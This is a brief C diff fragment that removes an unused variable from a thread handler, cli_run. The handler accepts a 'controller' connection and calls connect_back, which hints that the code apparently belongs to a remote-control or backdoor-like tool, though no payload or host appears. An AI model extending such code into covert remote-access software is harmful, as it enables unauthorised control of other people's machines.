@@ -154,7 +154,7 @@ void *cli_run(void *a)
     struct controller *cli=(struct controller *)a;
     printf("\n[!]Controller %s:%d connected\n", inet_ntoa(cli->addr.sin_addr), ntohs(cli->addr.sin_port));
 
-    char *cmds, *cmdr=(char *)allocate("char", 512), *retval=(char *)allocate("char", 256);
+    char  *cmdr=(char *)allocate("char", 512), *retval=(char *)allocate("char", 256);
 
     if(connect_back(cli))
     {
